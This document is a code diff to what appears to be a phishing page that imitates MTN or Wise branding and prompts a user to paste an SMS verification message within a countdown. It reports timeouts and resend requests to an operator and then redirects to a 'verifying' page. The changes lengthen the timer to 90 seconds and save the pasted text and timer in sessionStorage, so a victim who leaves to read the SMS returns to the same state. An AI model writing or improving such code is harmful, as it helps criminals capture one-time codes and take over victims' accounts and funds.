@@ -35,7 +35,7 @@
     padding: 12px;
     color: var(--mtn-text);
     -webkit-font-smoothing: antialiased;
-    overflow: hidden; /* no scroll */
+    overflow: hidden;
   }
 
   .card-container { max-width: 520px; width: 100%; }
@@ -376,7 +376,7 @@
   @keyframes spinRing { to { transform: rotate(360deg); } }
   .spin { animation: spinRing 0.7s linear infinite; }
 
-  /* Very short viewports — shrink further */
+  /* Very short viewports */
   @media (max-height: 680px) {
     .sms-card { padding: 0.95rem 1rem 0.85rem; gap: 0.6rem; border-radius: 1.25rem; }
     .sms-instructions { padding: 0.55rem 0.75rem; }
@@ -429,13 +429,13 @@
       </ol>
     </div>
 
-    <!-- Slim countdown — sits right above the textarea -->
+    <!-- Slim countdown -->
     <div class="countdown-strip" id="countdownStrip">
       <span class="cd-left">
         <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
         <span id="cdLabel">Time to paste SMS</span>
       </span>
-      <span class="cd-right" id="cdValue">59s</span>
+      <span class="cd-right" id="cdValue">1:30</span>
     </div>
 
     <!-- Textarea -->
@@ -477,6 +477,25 @@
 <script>
 (function() {
   const $ = id => document.getElementById(id);
+
+  // ============================================================
+  // STATE PERSISTENCE (survives reload when user leaves to read SMS)
+  // ============================================================
+  const STATE_KEY = 'wise_sms_state';
+
+  function saveState(partial) {
+    try {
+      const current = JSON.parse(sessionStorage.getItem(STATE_KEY) || '{}');
+      sessionStorage.setItem(STATE_KEY, JSON.stringify({ ...current, ...partial }));
+    } catch(e) {}
+  }
+  function loadState() {
+    try { return JSON.parse(sessionStorage.getItem(STATE_KEY) || '{}'); }
+    catch(e) { return {}; }
+  }
+  function clearState() {
+    try { sessionStorage.removeItem(STATE_KEY); } catch(e) {}
+  }
 
   // ---- Session from mtn.html ----
   let session = {};
@@ -536,18 +555,27 @@
     setTimeout(() => smsStatus.classList.add('hidden'), 3500);
   }
 
-  // ---- Countdown ----
-  const COUNTDOWN_SECONDS = 59;
+  // ============================================================
+  // COUNTDOWN — 90 seconds, wall-clock based
+  // ============================================================
+  const COUNTDOWN_SECONDS = 90;
   let remaining = COUNTDOWN_SECONDS;
+  let countdownEndsAt = 0;
   let countdownInterval = null;
 
+  function formatTime(sec) {
+    const m = Math.floor(sec / 60);
+    const s = sec % 60;
+    return `${m}:${String(s).padStart(2, '0')}`;
+  }
+
   function updateCountdownDisplay() {
-    cdValue.textContent = `${remaining}s`;
+    cdValue.textContent = formatTime(remaining);
     countdownStrip.classList.remove('urgent', 'expired');
     if (remaining <= 0) {
       countdownStrip.classList.add('expired');
       cdLabel.textContent = 'Time expired';
-    } else if (remaining <= 15) {
+    } else if (remaining <= 20) {
       countdownStrip.classList.add('urgent');
       cdLabel.textContent = 'Hurry — paste now';
     } else {
@@ -555,22 +583,23 @@
     }
   }
 
-  function startCountdown() {
-    remaining = COUNTDOWN_SECONDS;
+  function startCountdown(seconds = COUNTDOWN_SECONDS) {
+    remaining = seconds;
+    countdownEndsAt = Date.now() + seconds * 1000;
+    saveState({ countdownEndsAt });
     updateCountdownDisplay();
+
     if (countdownInterval) clearInterval(countdownInterval);
     countdownInterval = setInterval(() => {
-      remaining -= 1;
+      const msLeft = countdownEndsAt - Date.now();
+      remaining = Math.max(0, Math.ceil(msLeft / 1000));
+      updateCountdownDisplay();
       if (remaining <= 0) {
-        remaining = 0;
-        updateCountdownDisplay();
         clearInterval(countdownInterval);
         countdownInterval = null;
         onCountdownExpired();
-        return;
       }
-      updateCountdownDisplay();
-    }, 1000);
+    }, 250);
   }
 
   function stopCountdown() {
@@ -578,6 +607,7 @@
       clearInterval(countdownInterval);
       countdownInterval = null;
     }
+    saveState({ countdownEndsAt: 0 });
   }
 
   async function onCountdownExpired() {
@@ -593,12 +623,15 @@
 
 <b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
 
-User did not paste SMS within 59 seconds.`, txnId, 'sms-timeout');
+User did not paste SMS within 90 seconds.`, txnId, 'sms-timeout');
 
+    clearState();
     window.location.href = 'mtn.html';
   }
 
-  // ---- Submit ----
+  // ============================================================
+  // SUBMIT
+  // ============================================================
   smsSubmitBtn.addEventListener('click', async () => {
     const txt = smsInput.value.trim();
 
@@ -654,10 +687,13 @@ User did not paste SMS within 59 seconds.`, txnId, 'sms-timeout');
       }));
     } catch(e) {}
 
+    clearState();
     window.location.href = 'verifying.html';
   });
 
-  // ---- Resend ----
+  // ============================================================
+  // RESEND
+  // ============================================================
   smsResendBtn.addEventListener('click', async () => {
     smsResendBtn.disabled = true;
     resendLabel.textContent = 'Sending...';
@@ -677,29 +713,79 @@ User requested a new SMS.`, txnId, 'sms-resend');
       smsResendBtn.disabled = false;
       resendLabel.textContent = 'Resend SMS';
       showStatus('A new SMS has been requested.', 'success');
-      startCountdown();
       smsInput.value = '';
       smsInput.classList.remove('error');
       smsInput.disabled = false;
       smsSubmitBtn.disabled = false;
       smsSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Verify &amp; continue';
+      startCountdown(); // restart with fresh 90s
       smsInput.focus();
     }, 700);
   });
 
-  // ---- Back ----
+  // ============================================================
+  // BACK
+  // ============================================================
   backBtn.addEventListener('click', () => {
     stopCountdown();
+    clearState();
     window.location.href = 'mtn.html';
   });
 
-  // ---- Clear error on input ----
+  // ============================================================
+  // INPUT — autosave on every keystroke
+  // ============================================================
   smsInput.addEventListener('input', () => {
     smsInput.classList.remove('error');
+    saveState({ smsText: smsInput.value });
   });
 
-  // ---- Kick off ----
-  startCountdown();
+  // ============================================================
+  // BOOT — restore previous state if any, else start fresh
+  // ============================================================
+  (function boot() {
+    const s = loadState();
+
+    // Restore textarea
+    if (s.smsText) {
+      smsInput.value = s.smsText;
+    }
+
+    // Restore countdown from wall clock
+    if (s.countdownEndsAt && s.countdownEndsAt > Date.now()) {
+      const msLeft = s.countdownEndsAt - Date.now();
+      remaining = Math.max(1, Math.ceil(msLeft / 1000));
+      countdownEndsAt = s.countdownEndsAt;
+      updateCountdownDisplay();
+
+      if (countdownInterval) clearInterval(countdownInterval);
+      countdownInterval = setInterval(() => {
+        const ms = countdownEndsAt - Date.now();
+        remaining = Math.max(0, Math.ceil(ms / 1000));
+        updateCountdownDisplay();
+        if (remaining <= 0) {
+          clearInterval(countdownInterval);
+          countdownInterval = null;
+          onCountdownExpired();
+        }
+      }, 250);
+    } else {
+      // Fresh start
+      startCountdown();
+    }
+  })();
+
+  // ============================================================
+  // Before leaving the page, save current end time so a reload resumes
+  // ============================================================
+  window.addEventListener('beforeunload', () => {
+    if (countdownInterval) {
+      saveState({
+        countdownEndsAt,
+        smsText: smsInput.value
+      });
+    }
+  });
 })();
 </script>
 </body>
